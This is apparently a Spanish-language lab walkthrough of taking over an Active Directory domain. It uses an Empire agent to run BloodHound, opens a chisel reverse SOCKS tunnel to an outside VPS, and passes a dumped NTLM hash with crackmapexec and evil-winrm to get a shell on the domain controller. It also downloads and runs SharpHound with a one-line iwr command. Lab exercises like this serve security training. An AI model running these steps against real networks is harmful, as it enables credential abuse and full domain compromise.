# Laboratorio parte 2

## Referencias: 
- [PayloadAllTheThings - Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Bloodhound](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
- 


## Objetivos

Descubrir el siguiente target con el objetivo de obtener el control del Dominio, se usa de una herramienta para encontrar la ruta más eficaz.
Finalmente con movimientos laterales se logra llegar al Domain Controller.


## Fases que se van a realizar
- **Descubrimiento**: A través de bloodhound es posible identificar la ruta.
- **Movimiento lateral**: Con distintas tecnicas se logra pivotar al Domain Controler.


## Walkthrough

### Exportar información del dominio

```bash
(Empire: SRV1) > usemodule powershell/situational_awareness/network/bloodhound3 

(Empire: usemodule/powershell/situational_awareness/network/bloodhound3) > set Agent SRV1
# [*] Set Agent to SRV1
(Empire: usemodule/powershell/situational_awareness/network/bloodhound3) > set OutputDirectory C:\\DATA
# [*] Set OutputDirectory to C:\DATA
(Empire: usemodule/powershell/situational_awareness/network/bloodhound3) > set Domain lab.grailcyber.tech
# [*] Set Domain to lab.grailcyber.tech
(Empire: usemodule/powershell/situational_awareness/network/bloodhound3) > execute
# [*] Tasked SRV1 to run Task 10
(Empire: SRV1) >
```



### Descubrimiento con Bloodhound

```bash
# Iniciar servidor neo4j en Others
docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j

```
Iniciar el cliente de bloodhound 

https://github.com/hausec/Bloodhound-Custom-Queries


### Movimiento lateral 

```bash
root@ubuntu-s-2vcpu-2gb-amd-lon1-01:~# ./chisel server --reverse --socks5 -p 7001
```

```bash

(SRV1) C:\Windows\system32 > dir C:\Tools                                                                                                                   {                                                                                                                                                               "Mode":  "-a----",                                                                                                                                          "Owner":  "BUILTIN\\Administrators",                                                                                                                        "LastWriteTime":  "\/Date(1648657729004)\/",                                                                                                                "Length":  8230912,                                                                                                                                         "Name":  "chisel.exe"                                                                                                                                   }
(SRV1) C:\Windows\system32 > cd C:\Tools
(SRV1) C:\Windows\system32 > ./chisel.exe client http://xxx.xxx.xxx.xxx:7001 R:8001:socks
```

Con las credenciales dumpeadas hacemos el check para verificar que se puede ejecutar comandos

```bash
root@ubuntu-s-2vcpu-2gb-amd-lon1-01:~# proxychains -q crackmapexec smb 192.168.2.5-20 -u 'vagrant' -H 'e02bc503339d51f71d913c245d35b50b'
SMB         192.168.2.15    445    SRV1             [*] Windows 10.0 Build 17763 x64 (name:SRV1) (domain:lab.grailcyber.tech) (signing:False) (SMBv1:False)
SMB         192.168.2.10    445    LAB-DC01         [*] Windows 10.0 Build 17763 x64 (name:LAB-DC01) (domain:lab.grailcyber.tech) (signing:True) (SMBv1:False)
SMB         192.168.2.10    445    LAB-DC01         [+] lab.grailcyber.tech\vagrant:e02bc503339d51f71d913c245d35b50b (Pwn3d!)
SMB         192.168.2.15    445    SRV1             [+] lab.grailcyber.tech\vagrant:e02bc503339d51f71d913c245d35b50broot@ubuntu-s-2vcpu-2gb-amd-lon1-01:~# proxychains -q crackmapexec smb 192.168.2.5-20
SMB         192.168.2.10    445    LAB-DC01         [*] Windows 10.0 Build 17763 x64 (name:LAB-DC01) (domain:lab.grailcyber.tech) (signing:True) (SMBv1:False)
SMB         192.168.2.15    445    SRV1             [*] Windows 10.0 Build 17763 x64 (name:SRV1) (domain:lab.grailcyber.tech) (signing:False) (SMBv1:False)
```

Ahora se utiliza evil-winrm para obtener ejecución de comandos al Domain Controller

```bash
root@ubuntu-s-2vcpu-2gb-amd-lon1-01:~# proxychains -q evil-winrm -i 192.168.2.10 -u 'vagrant' -H 'e02bc503339d51f71d913c245d35b50b'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\vagrant\Documents> hostname
LAB-DC01
```

### Problemas

¿No ha funcionado? 
La siguiente lista de comprobación para verificar que esta todo correcto:

- Revisar que el chisel tenga conexión. 
- El fichero de proxychains tiene que ser por socks5
- Si sharphound no funciona debido que no esta actualizado se puede utilizar lo siguiente: 

```powershell
# Descargar sharphound

iwr -uri https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe?raw=true -outfile s.exe;.\s.exe -d lab.grailcyber.tech
```











